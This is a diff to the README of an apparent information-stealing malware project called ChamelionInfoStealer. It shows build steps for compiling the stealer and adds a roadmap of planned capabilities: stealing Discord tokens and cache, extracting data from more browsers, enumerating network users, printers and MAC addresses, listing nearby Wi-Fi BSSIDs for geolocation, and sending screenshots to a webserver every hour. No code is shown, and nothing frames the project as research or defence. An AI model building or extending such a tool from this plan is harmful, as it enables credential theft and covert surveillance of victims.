@@ -37,3 +37,15 @@ You're gonna need to follow these steps to compile the project :<br>
      or<br>
      - (<b>DEBUG</b>) : <b>cmake --build . --config Debug</b><br><br>
      - Compiled file will be located in ChamelionInfoStealer/Release or ChamelionInfoStealer\Debug (Depending on how you compiled the file)<br>
+
+
+<h2>Things to come for Chamelion</h2>
+     - <b>Printer Enumeration</b>
+     - <b>Black Fax Attack</b>
+     - <b>Net Users Enumeration</b>
+     - <b>Discord Cache Stealing</b>
+     - <b>Discord Token and cache stored data</b>
+     - <b>Listing of all available BSSID around the computer (Useful with WIGLE)</b>
+     - <b>Listing of every computer with their MAC Address</b>
+     - <b>Extraction of data from more browsers</b>
+     - <b>Take screenshots and send them every hour to the webserver.</b>
